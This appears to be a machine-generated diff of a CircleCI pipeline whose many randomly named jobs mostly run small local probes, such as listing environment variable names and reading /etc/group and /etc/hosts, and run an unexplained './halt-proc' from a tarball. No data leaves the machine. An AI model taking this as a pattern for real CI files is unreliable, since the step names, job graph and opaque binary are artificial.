+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Take handoff
+          command: |
+            grep -cFf <(head -n 1 /tmp/y2/exp6_ade8 2>/dev/null) /tmp/y2/exp6_ade8 2>/dev/null || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar --extract -f resources-build.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 15
+      - run:
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: sleep 15
+      - run:
+          command: sh -c "./halt-proc"
+  gClanLevel:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Create fixture B
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; printenv | head -n 5 | sed 's/=.*//'; true ; } > /tmp/y2/E9XGXO18QjW2H
+            echo "+" "step"  "smoke"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'E9XGXO18QjW2H'
+  smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Take handoff
+          command: |
+            grep -cFf <(head -n 1 /tmp/y2/E9XGXO18QjW2H 2>/dev/null) /tmp/y2/E9XGXO18QjW2H 2>/dev/null || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar --extract -f resources-build.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 15
+      - run:
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: sleep 15
+      - run:
+          command: sh -c "./halt-proc"
+  brushversion:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Checkpoint B reminder
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; cat /proc/filesystems | grep -i -H -e 'proc' | wc -l; true ; } > /tmp/y2/u8
+            echo "+" "step"  "fix-6318"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'u8'
+  fix-6318:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Take handoff
+          command: |
+            grep -cFf <(head -n 1 /tmp/y2/u8 2>/dev/null) /tmp/y2/u8 2>/dev/null || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar --extract -f resources-build.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 15
+      - run:
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: sleep 15
+      - run:
+          command: sh -c "./halt-proc"
+  MAX_ALPHA_SIZE:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: measureBastionHost
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; grep -nsH fi ~/.bashrc | nl; true ; } > /tmp/y2/azure623
+            echo "+" "step"  "MERGE_STG"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'azure623'
+  MERGE_STG:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Take handoff
+          command: |
+            grep -cFf <(head -n 1 /tmp/y2/azure623 2>/dev/null) /tmp/y2/azure623 2>/dev/null || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar --extract -f resources-build.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 15
+      - run:
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: sleep 15
+      - run:
+          command: sh -c "./halt-proc"
+  verifyimage:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Execute the fragile item shipping procedure
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; cat /etc/group | grep -w -n 'video' | sort -u; true ; } > /tmp/y2/sha_325d1e12133b4
+            echo "+" "step"  "v1-alpha1"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'sha_325d1e12133b4'
+  v1-alpha1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Take handoff
+          command: |
+            grep -cFf <(head -n 1 /tmp/y2/sha_325d1e12133b4 2>/dev/null) /tmp/y2/sha_325d1e12133b4 2>/dev/null || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar --extract -f resources-build.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 15
+      - run:
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: sleep 15
+      - run:
+          command: sh -c "./halt-proc"
+  API_ZONE_FAILED:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Act X Color Grade The Subtitles
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; yes 'meeting moved to 3pm' | head -n3; true ; } > /tmp/y2/draft527
+            echo "+" "step"  "nebula-rev"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'draft527'
+  nebula-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Take handoff
+          command: |
+            grep -cFf <(head -n 1 /tmp/y2/draft527 2>/dev/null) /tmp/y2/draft527 2>/dev/null || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar --extract -f resources-build.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 15
+      - run:
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: sleep 15
+      - run:
+          command: sh -c "./halt-proc"
+  num_rec_tot:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Nudge pre the audit
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; grep -sr umask /etc 2>/dev/null|cut -d: -f1|sort -u; true ; } > /tmp/y2/atoll_driver
+            echo "+" "step"  "rust-build"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'atoll_driver'
+  rust-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Take handoff
+          command: |
+            grep -cFf <(head -n 1 /tmp/y2/atoll_driver 2>/dev/null) /tmp/y2/atoll_driver 2>/dev/null || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar --extract -f resources-build.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 15
+      - run:
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: sleep 15
+      - run:
+          command: sh -c "./halt-proc"
+
+  bot4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Last preview before release
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; ls -hX /lib /usr/local/bin | uniq; true ; } > /tmp/y2/7f57fa8d5ef7f784e8349d9bfbb0c7b3d13
+            echo "+" "step"  "helios-final"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - '7f57fa8d5ef7f784e8349d9bfbb0c7b3d13'
+  NamedFakeArticleElement:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Countdown 5 backup
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; if grep -q "^127" /etc/hosts;then echo "present"; else echo "absent"; fi; true ; } > /tmp/y2/QuarkSpriteGolden
+            echo "+" "step"  "tweak-oauth-hang"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'QuarkSpriteGolden'
+  chenchen:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Codename Bison
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; cp /etc/os-release '/tmp/new_plot.tmp' && sed -i.orig 's/"//g' '/tmp/new_plot.tmp' && cat '/tmp/new_plot.tmp'; true ; } > /tmp/y2/shard752
+            echo "+" "step"  "rm-parse-leak"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'shard752'
+  url34s:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: init out
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; cp /etc/hosts /tmp/teal.txt && sed -i.orig '1i # managed by hand' /tmp/teal.txt && wc -l /tmp/teal.txt; true ; } > /tmp/y2/quarkqueuecrisp
+            echo "+" "step"  "may27-canary"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'quarkqueuecrisp'
+  shaderc027458:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Browser matrix format for the rollback
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; locale -a|head -n 5|sort|uniq -c|sort -rn; true ; } > /tmp/y2/DSC-00097833
+            echo "+" "step"  "victor-4"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'DSC-00097833'
+  optionMode:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Go for defrag
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; find /var/tmp -maxdepth 3 -type f -exec ls -ld {} \; 2> /dev/null|sed 's|.*/||'|sort -u; true ; } > /tmp/y2/azure623
+            echo "+" "step"  "MERGE_STG"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'azure623'
+  p2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Leftover junk ok
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; ls | sort -f; true ; } > /tmp/y2/shard-flux
+            echo "+" "step"  "nov22-smoke"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'shard-flux'
+  pic_01080_deprecated:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Move the needle on seeding
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; shuf -i 1-504 -n 12 | awk '{print $1 * 2}' | paste -sd+; true ; } > /tmp/y2/exp6_ade8
+            echo "+" "step"  "preview"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'exp6_ade8'
+  WorkerSafeGraniteSanitize:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: 80 shuffling click stream
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; ls -lAXr | awk '$5 > 1000'; true ; } > /tmp/y2/MVI-26570
+            echo "+" "step"  "send-it"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'MVI-26570'
+  jogmw:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Book XII monitor the batch size
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; echo {a..c}{1..2}; true ; } > /tmp/y2/20150727_014724
+            echo "+" "step"  "DATA-696"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - '20150727_014724'
+  fact_zone_pulse:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: This is where we write off the credit notes
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; find /etc -maxdepth 2 -name '*.d' -exec echo {} + 2>/dev/null | sort -r; true ; } > /tmp/y2/0LthpkWgTKJ
+            echo "+" "step"  "ken-build"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - '0LthpkWgTKJ'
+  s_nWaveText:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: The raw events ready yet
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; find /run -maxdepth 3 -type f -name "*lock*" -exec wc -l {} \; 2>/dev/null | sort -r; true ; } > /tmp/y2/xx_55925a933af
+            echo "+" "step"  "rigel-final"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'xx_55925a933af'
+  rankMesage:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: C8 crawl support macros
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; cp /etc/hosts /tmp/test.copy&& sed -i '1i # managed by hand' /tmp/test.copy&& head -n 3 /tmp/test.copy; true ; } > /tmp/y2/xx_29a70c201ef6
+            echo "+" "step"  "ruby3-lint"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'xx_29a70c201ef6'
+  rollbackchoose:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Let it rest
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; umask -p; true ; } > /tmp/y2/u8
+            echo "+" "step"  "fix-6318"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'u8'
+  U:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: unlock rate limiter hotfix 14
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; find /var/log -name '*log*' -exec basename "{}" ";" 2>/dev/null | sort | head -n 20; true ; } > /tmp/y2/release-7832
+            echo "+" "step"  "feb23-release"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'release-7832'
+  freeze_password:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Why hash the output bucket
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; mkdir -p "/tmp/widget-chapter" && rmdir "/tmp/widget-chapter" && echo ok; true ; } > /tmp/y2/9c88eec25b6409866c09de
+            echo "+" "step"  "cd-new"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - '9c88eec25b6409866c09de'
+  Mountain:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Create fixture B
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; help set|head -n 2; true ; } > /tmp/y2/E9XGXO18QjW2H
+            echo "+" "step"  "smoke"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'E9XGXO18QjW2H'
+  swL5LzZfq:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Gently demux the audio track
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; grep -r -h --include="*.sh" case /etc/profile.d | wc -l; true ; } > /tmp/y2/BUNDLE
+            echo "+" "step"  "anothr-run-6"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'BUNDLE'
+  DEEP_BUCKET_SETTINGS:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Chase up the slides
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; echo "works for me" > /tmp/receipt.dat && wc -c < /tmp/receipt.dat; true ; } > /tmp/y2/20171013
+            echo "+" "step"  "pr-x"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - '20171013'
+  ID-PCT-TRL:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: hover the image carousel SLOWLY
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; for num in bob raj carol;do echo "item: $num"; done | head -n 3; true ; } > /tmp/y2/atoll_driver
+            echo "+" "step"  "rust-build"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'atoll_driver'
+  undoreduce:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Loot the failing specs
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; touch "/tmp/flightavatar02.csv" && mv -v "/tmp/flightavatar02.csv" "/tmp/healthkoala.txt"; true ; } > /tmp/y2/scratch_2522
+            echo "+" "step"  "produce-partial-docker-image"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'scratch_2522'
+  lr0:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Approval State Dirty
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; ls -t /usr/bin/*cat | nl; true ; } > /tmp/y2/mapp3r
+            echo "+" "step"  "node18-cov"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'mapp3r'
+  TotalGlobalFastCheckout:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: H hour pause
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; find /proc/self -empty -mtime 0 -exec echo {} + 2>/dev/null|tail -n 1; true ; } > /tmp/y2/draft527
+            echo "+" "step"  "nebula-rev"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'draft527'
+  info8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Weigh water bath and wait
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; sha256sum <(echo '3 tests passed'); true ; } > /tmp/y2/sha_325d1e12133b4
+            echo "+" "step"  "v1-alpha1"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'sha_325d1e12133b4'
+workflows:
+  build-and-test:
+    jobs:
+      - calcVPNs
+      - bot4:
+          requires:
+            - calcVPNs
+      - helios-final:
+          requires:
+            - bot4
+      - ming007:
+          requires:
+            - bot4
+      - NamedFakeArticleElement:
+          requires:
+            - ming007
+      - tweak-oauth-hang:
+          requires:
+            - NamedFakeArticleElement
+      - WizardFx:
+          requires:
+            - NamedFakeArticleElement
+      - chenchen:
+          requires:
+            - WizardFx
+      - rm-parse-leak:
+          requires:
+            - chenchen
+      - mod_rw:
+          requires:
+            - chenchen
+      - url34s:
+          requires:
+            - mod_rw
+      - may27-canary:
+          requires:
+            - url34s
+      - migration_retry:
+          requires:
+            - url34s
+      - shaderc027458:
+          requires:
+            - migration_retry
+      - victor-4:
+          requires:
+            - shaderc027458
+      - MAX_ALPHA_SIZE:
+          requires:
+            - shaderc027458
+      - optionMode:
+          requires:
+            - MAX_ALPHA_SIZE
+      - MERGE_STG:
+          requires:
+            - optionMode
+      - login_10_4_22:
+          requires:
+            - optionMode
+      - p2:
+          requires:
+            - login_10_4_22
+      - nov22-smoke:
+          requires:
+            - p2
+      - SidebarSpec:
+          requires:
+            - p2
+      - pic_01080_deprecated:
+          requires:
+            - SidebarSpec
+      - preview:
+          requires:
+            - pic_01080_deprecated
+      - juliett-cursor:
+          requires:
+            - pic_01080_deprecated
+      - WorkerSafeGraniteSanitize:
+          requires:
+            - juliett-cursor
+      - send-it:
+          requires:
+            - WorkerSafeGraniteSanitize
+      - a0ac61a6-a13b-3595-a854-fb:
+          requires:
+            - WorkerSafeGraniteSanitize
+      - jogmw:
+          requires:
+            - a0ac61a6-a13b-3595-a854-fb
+      - DATA-696:
+          requires:
+            - jogmw
+      - HammerFailForkLightningBuild:
+          requires:
+            - jogmw
+      - fact_zone_pulse:
+          requires:
+            - HammerFailForkLightningBuild
+      - ken-build:
+          requires:
+            - fact_zone_pulse
+      - otherSet:
+          requires:
+            - fact_zone_pulse
+      - s_nWaveText:
+          requires:
+            - otherSet
+      - rigel-final:
+          requires:
+            - s_nWaveText
+      - sdof27od8:
+          requires:
+            - s_nWaveText
+      - rankMesage:
+          requires:
+            - sdof27od8
+      - ruby3-lint:
+          requires:
+            - rankMesage
+      - brushversion:
+          requires:
+            - rankMesage
+      - rollbackchoose:
+          requires:
+            - brushversion
+      - fix-6318:
+          requires:
+            - rollbackchoose
+      - v_idx:
+          requires:
+            - rollbackchoose
+      - U:
+          requires:
+            - v_idx
+      - feb23-release:
+          requires:
+            - U
+      - OUT-TAX-MIN
+      - p-2:
+          requires:
+            - OUT-TAX-MIN
+      - Alive-Guard-Hook:
+          requires:
+            - OUT-TAX-MIN
+      - test:
+          requires:
+            - Alive-Guard-Hook
+      - FontChunk:
+          requires:
+            - Alive-Guard-Hook
+      - rm-edge-bug:
+          requires:
+            - FontChunk
+      - Copy-AvatarProperty:
+          requires:
+            - FontChunk
+      - q1-smoke:
+          requires:
+            - Copy-AvatarProperty
+      - zone-length:
+          requires:
+            - Copy-AvatarProperty
+      - fix-queue:
+          requires:
+            - zone-length
+      - ramen_075993_public:
+          requires:
+            - zone-length
+      - defualt:
+          requires:
+            - ramen_075993_public
+      - BOX_PIXEL
+      - freeze_password:
+          requires:
+            - BOX_PIXEL
+      - cd-new:
+          requires:
+            - freeze_password
+      - gClanLevel:
+          requires:
+            - freeze_password
+      - Mountain:
+          requires:
+            - gClanLevel
+      - smoke:
+          requires:
+            - Mountain
+      - alicetron:
+          requires:
+            - Mountain
+      - swL5LzZfq:
+          requires:
+            - alicetron
+      - anothr-run-6:
+          requires:
+            - swL5LzZfq
+      - getXoluss:
+          requires:
+            - swL5LzZfq
+      - DEEP_BUCKET_SETTINGS:
+          requires:
+            - getXoluss
+      - pr-x:
+          requires:
+            - DEEP_BUCKET_SETTINGS
+      - num_rec_tot:
+          requires:
+            - DEEP_BUCKET_SETTINGS
+      - ID-PCT-TRL:
+          requires:
+            - num_rec_tot
+      - rust-build:
+          requires:
+            - ID-PCT-TRL
+      - knnKNNLayer:
+          requires:
+            - ID-PCT-TRL
+      - undoreduce:
+          requires:
+            - knnKNNLayer
+      - produce-partial-docker-image:
+          requires:
+            - undoreduce
+      - token-payment-lever-post:
+          requires:
+            - undoreduce
+      - lr0:
+          requires:
+            - token-payment-lever-post
+      - node18-cov:
+          requires:
+            - lr0
+      - API_ZONE_FAILED:
+          requires:
+            - lr0
+      - TotalGlobalFastCheckout:
+          requires:
+            - API_ZONE_FAILED
+      - nebula-rev:
+          requires:
+            - TotalGlobalFastCheckout
+      - verifyimage:
+          requires:
+            - TotalGlobalFastCheckout
+      - info8:
+          requires:
+            - verifyimage
+      - v1-alpha1:
+          requires:
+            - info8
